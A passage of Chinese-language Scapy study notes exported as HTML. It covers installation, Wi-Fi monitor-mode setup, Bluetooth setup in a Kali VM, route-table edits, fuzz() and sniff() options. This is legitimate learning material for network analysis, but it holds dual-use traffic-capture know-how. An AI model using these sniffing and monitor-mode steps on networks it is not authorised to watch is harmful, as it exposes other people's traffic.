  color: black;
}

foreignObject[data-mjx-xml] {
  font-family: initial;
  line-height: normal;
  overflow: visible;
}

mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
  stroke-width: 3;
}

g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}

.MathJax g[data-mml-node="xypic"] path {
  stroke-width: inherit;
}
mjx-container[jax="SVG"] path[data-c], mjx-container[jax="SVG"] use[data-c] {
							stroke-width: 0;
						} .typora-export li, .typora-export p, .typora-export,  .footnote-line {white-space: normal;} 
</style><title>README</title>
</head>
<body class='typora-export os-windows'><div class='typora-export-content'>
<div id='write'  class=''><h1 id='scapy-状元笔记'><span>Scapy 状元笔记</span></h1><h2 id='一安装'><span>一.安装</span></h2><h3 id='11必选'><span>1.1.必选</span></h3><p><span>tcpdump: </span><code>sudo apt-get install tcpdump</code></p><p><span>Scapy: </span><code>pip3 install --pre scapy</code></p><h3 id='12可选'><span>1.2.可选</span></h3><p><code>pip3 install matplotlib vpython pyx cryptography sphinx  sphinx_rtd_theme pylint</code></p><p><span>nmap</span></p><p><span>pyx:</span></p><ul><li><code>sudo apt-get install texlive</code></li></ul><p><span>wireshark</span></p><h2 id='二启动'><span>二.启动</span></h2><h3 id='21启动scapy'><span>2.1.启动Scapy</span></h3><p><code>sudo scapy</code></p><h3 id='22wi-fi启动监听模式'><span>2.2.wi-fi启动监听模式</span></h3><p><code>sudo iw dev wlan0 interface add mon0 type monitor</code></p><p><code>sudo ifconfig mon0 up</code></p><p><code>sudo ip link set mon0 up</code></p><h3 id='23启动蓝牙'><span>2.3.启动蓝牙</span></h3><p><span>kali虚拟机启动蓝牙</span></p><ol start='' ><li><p><span>本机关闭蓝牙</span></p></li><li><p><img src="images/Scapy/2020-01-02-23-40-03.png" referrerpolicy="no-referrer"></p></li><li><p><img src="images/Scapy/2020-01-02-23-44-49.png" referrerpolicy="no-referrer"></p></li><li><p><code>apt-get install bluetooth</code></p></li><li><p><code>service bluetooth restart</code></p></li><li><p><code>service bluetooth status</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><span><span>​</span>x</span></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">bluetooth.service - Bluetooth service</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; Loaded: loaded (/lib/systemd/system/bluetooth.service; enabled; vendor pre&gt;</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; Active: active (running) since Wed 2020-01-01 06:22:50 EST; 3min 10s ago</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; Docs: man:bluetoothd(8)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Main PID: 595 (bluetoothd)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; Status: "Running"</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp;  Tasks: 1 (limit: 4615)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; Memory: 4.0M</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; CGroup: /system.slice/bluetooth.service</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; └─595 /usr/lib/bluetooth/bluetoothd</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 271px;"></div><div class="CodeMirror-gutters" style="display: none; height: 271px;"></div></div></div></pre></li><li><p><code>systemctl enable /lib/systemd/system/bluetooth.service</code></p></li><li><p><code>systemctl start bluetooth.service</code></p></li><li><p><span>验证蓝牙设备</span></p><ul><li><p><code>hcitool dev</code></p></li><li><p><span>如果虚拟机获取不到蓝牙</span></p><ul><li><img src="images/Scapy/2020-01-03-15-33-54.png" referrerpolicy="no-referrer"></li><li><img src="images/Scapy/2020-01-03-15-21-09.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>则在Device Manager中把蓝牙先禁用再启用</span></p><ul><li><img src="images/Scapy/2020-01-03-15-19-57.png" referrerpolicy="no-referrer"></li><li><img src="images/Scapy/2020-01-03-15-21-35.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>然后选择你要连接到的虚拟机</span></p><ul><li><img src="images/Scapy/2020-01-03-15-27-28.png" referrerpolicy="no-referrer"></li></ul></li><li><p><span>连接后可以等俩分钟再验证</span></p></li></ul></li><li><p><span>测试LE Scan</span></p><ul><li><code>hcitool lescan</code></li></ul></li></ol><h2 id='三修改主题'><span>三.修改主题</span></h2><h3 id='31临时'><span>3.1.临时</span></h3><p><code>conf.color_theme = ColorOnBlackTheme()</code></p><h3 id='32永久'><span>3.2.永久</span></h3><p><span>修改文件</span><code>/usr/local/lib/python3.7/dist-packages/scapy/main.py</code></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Pyhton"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="pyhton"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">from scapy.themes import ColorOnBlackTheme</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">conf.color_theme = ColorOnBlackTheme()</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 49px;"></div><div class="CodeMirror-gutters" style="display: none; height: 49px;"></div></div></div></pre><h2 id='四常用命令'><span>四.常用命令</span></h2><p><a href='https://scapy.readthedocs.io/en/latest/api/scapy.packet.html' target='_blank' class='url'>https://scapy.readthedocs.io/en/latest/api/scapy.packet.html</a>
<a href='https://scapy.readthedocs.io/en/latest/api/scapy.utils.html' target='_blank' class='url'>https://scapy.readthedocs.io/en/latest/api/scapy.utils.html</a></p><p><code>explore</code><span>: 显示层中的包类型</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; explore(scapy.layers.l2)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Packets contained in scapy.layers.l2:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Class &nbsp; &nbsp;  |Name</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-----------|-----------------------</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ARP &nbsp; &nbsp; &nbsp;  |ARP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CookedLinux|cooked linux</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Dot1AD &nbsp; &nbsp; |802_1AD</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Dot1Q &nbsp; &nbsp;  |802.1Q</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Dot3 &nbsp; &nbsp; &nbsp; |802.3</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ERSPAN &nbsp; &nbsp; |ERSPAN</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Ether &nbsp; &nbsp;  |Ethernet</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GRE &nbsp; &nbsp; &nbsp;  |GRE</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GRE_PPTP &nbsp; |GRE PPTP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">GRErouting |GRE routing information</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">LLC &nbsp; &nbsp; &nbsp;  |LLC</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Loopback &nbsp; |Loopback</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">SNAP &nbsp; &nbsp; &nbsp; |SNAP</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">STP &nbsp; &nbsp; &nbsp;  |Spanning Tree Protocol</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 444px;"></div><div class="CodeMirror-gutters" style="display: none; height: 444px;"></div></div></div></pre><p><code>ls</code><span>: 显示协议参数其及默认值</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&gt;&gt;&gt; ls(IP)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">version &nbsp;  : BitField (4 bits) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (4)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ihl &nbsp; &nbsp; &nbsp;  : BitField (4 bits) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (None)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">tos &nbsp; &nbsp; &nbsp;  : XByteField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  = (0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">len &nbsp; &nbsp; &nbsp;  : ShortField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  = (None)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">id &nbsp; &nbsp; &nbsp; &nbsp; : ShortField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  = (1)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">flags &nbsp; &nbsp;  : FlagsField (3 bits) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (&lt;Flag 0 ()&gt;)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">frag &nbsp; &nbsp; &nbsp; : BitField (13 bits) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;  = (0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ttl &nbsp; &nbsp; &nbsp;  : ByteField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (64)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">proto &nbsp; &nbsp;  : ByteEnumField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (0)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chksum &nbsp; &nbsp; : XShortField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (None)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">src &nbsp; &nbsp; &nbsp;  : SourceIPField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (None)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">dst &nbsp; &nbsp; &nbsp;  : DestIPField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = (None)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">options &nbsp;  : PacketListField &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; = ([])</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 346px;"></div><div class="CodeMirror-gutters" style="display: none; height: 346px;"></div></div></div></pre><p><code>/</code><span>: 层叠加</span></p><ul><li><span>例: </span><code>Ether()/IP()/UDP()</code></li></ul><p><code>rdpcap(filename, count=-1)</code><span>: 读取pcap文件, count: 读取几个包, 默认全部</span></p><p><code>hexdump()</code></p><p><code>import_hexcap()</code></p><p><code>export_object()</code><span>: export a base64 encoded Python data structure representing a packet</span></p><p><code>import_object()</code></p><p><code>.summary()</code><span>: 显示概要</span></p><ul><li><span>ans.summary(lambda s,r : r.sprintf(&quot;%TCP.sport% \t %TCP.flags%&quot;) ) </span></li></ul><p><code>.nsummary()</code><span>: 显示概要(带数据包号)</span></p><p><code>fuzz(p)</code><span>: 返回除用户指定的数据外,其他参数均为随机的p</span></p><p><code>del()</code><span>: 就数据恢复默认值</span></p><ul><li><span>例: </span><code>del(a.ttl)</code></li></ul><p><code>conf.route</code><span>: 查看路由表</span></p><ul><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python" style="break-inside: unset;"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Network</span> &nbsp; &nbsp; <span class="cm-variable">Netmask</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">Gateway</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">Iface</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">127.0.0.0</span> &nbsp; <span class="cm-number">255.0.0.0</span> &nbsp; &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">lo</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192.168.8.0</span> <span class="cm-number">255.255.255.0</span> &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">192.168.8.1</span> &nbsp; &nbsp; <span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span>.<span class="cm-property">delt</span>(<span class="cm-variable">net</span><span class="cm-operator">=</span><span class="cm-string">"0.0.0.0/0"</span>,<span class="cm-variable">gw</span><span class="cm-operator">=</span><span class="cm-string">"192.168.8.1"</span>) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span>.<span class="cm-property">add</span>(<span class="cm-variable">net</span><span class="cm-operator">=</span><span class="cm-string">"0.0.0.0/0"</span>,<span class="cm-variable">gw</span><span class="cm-operator">=</span><span class="cm-string">"192.168.8.254"</span>) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span>.<span class="cm-property">add</span>(<span class="cm-variable">host</span><span class="cm-operator">=</span><span class="cm-string">"192.168.1.1"</span>,<span class="cm-variable">gw</span><span class="cm-operator">=</span><span class="cm-string">"192.168.8.1"</span>) </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Network</span> &nbsp; &nbsp; <span class="cm-variable">Netmask</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">Gateway</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">Iface</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">127.0.0.0</span> &nbsp; <span class="cm-number">255.0.0.0</span> &nbsp; &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">lo</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192.168.8.0</span> <span class="cm-number">255.255.255.0</span> &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">192.168.8.254</span> &nbsp; <span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192.168.1.1</span> <span class="cm-number">255.255.255.255</span> <span class="cm-number">192.168.8.1</span> &nbsp; &nbsp; <span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span>.<span class="cm-property">resync</span>() </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-operator">&gt;&gt;&gt;</span> <span class="cm-variable">conf</span>.<span class="cm-property">route</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-variable">Network</span> &nbsp; &nbsp; <span class="cm-variable">Netmask</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-variable">Gateway</span> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">Iface</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">127.0.0.0</span> &nbsp; <span class="cm-number">255.0.0.0</span> &nbsp; &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">lo</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">192.168.8.0</span> <span class="cm-number">255.255.255.0</span> &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp;<span class="cm-variable">eth0</span> </span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; <span class="cm-number">0.0.0.0</span> &nbsp; &nbsp; &nbsp; &nbsp; <span class="cm-number">192.168.8.1</span> &nbsp; &nbsp; <span class="cm-variable">eth0</span></span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 494px;"></div><div class="CodeMirror-gutters" style="display: none; height: 494px;"></div></div></div></pre><p><code>traceroute()</code></p></li></ul><p><code>sniff()</code></p><blockquote><p><span>嗅探数据包并返回数据包列表. </span></p></blockquote><ul><li><p><span>count: 要捕获的包的数量. 0意味着无穷.</span></p></li><li><p><span>store: 是否存储嗅探包或丢弃它们</span></p></li><li><p><span>prn: 应用于每个包的函数, 如果返回某个内容, 则显示它</span></p><ul><li><span>例: prn = lambda x: x.summary()</span></li></ul></li><li><p><span>session: defragment packets, before executing the prn. </span></p><ul><li><span>IPSession: defragment IP packets on-the-ﬂow, to make a stream usable by prn. </span></li><li><span>TCPSession: defragment certain TCP protocols*. Only HTTP 1.0 currently uses this functionality.</span></li><li><span>NetflowSession: resolve Netﬂow V9 packets from their NetﬂowFlowset information objects</span></li></ul></li><li><p><span>filter: BPF过滤器</span></p><ul><li><span>例: filter=&quot;arp&quot;</span></li><li><a href='https://biot.com/capstats/bpf.html' target='_blank' class='url'>https://biot.com/capstats/bpf.html</a></li></ul></li><li><p><span>lfilter: 将Python函数应用于每个包, 以确定是否可以执行进一步的操作</span></p><ul><li><span>例: lfilter = lambda x: x.haslayer(Padding)</span></li></ul></li><li><p><span>offline: 从PCAP文件(或PCAP文件列表)读取数据包, 而不是嗅探它们</span></p></li><li><p><span>timeout: 给定时间后停止嗅探(默认:None)</span></p></li><li><p><span>L2socket: 使用提供的L2socket(默认:使用conf.L2listen). </span></p></li><li><p><span>opened_socket: 为.recv()提供一个对象(或对象列表). </span></p></li><li><p><span>stop_filter: Python函数应用于每个包, 以确定我们是否必须在这个包之后停止捕获</span></p><ul><li><span>例: stop_filter = lambda x: x.haslayer(TCP)</span></li></ul></li><li><p><span>iface: 接口或接口列表(默认:None, 嗅探所有接口). </span></p></li><li><p><span>monitor: 使用监控模式. 可能无法在所有操作系统上使用</span></p></li><li><p><span>started_callback: 嗅探器开始嗅探时立即调用(默认:None)</span></p></li><li><p><span>例:</span></p><ul><li><code>sniff(prn=lambda x:x.summary(), lfilter=lambda x:x.haslayer(TCP), stop_filter=lambda x:x.haslayer(Padding))</code></li></ul></li></ul><p><code>AsyncSniffer()</code></p><ul><li><p><span>例:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang="Python"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="python"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 10.3394px; left: 3.9931px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div 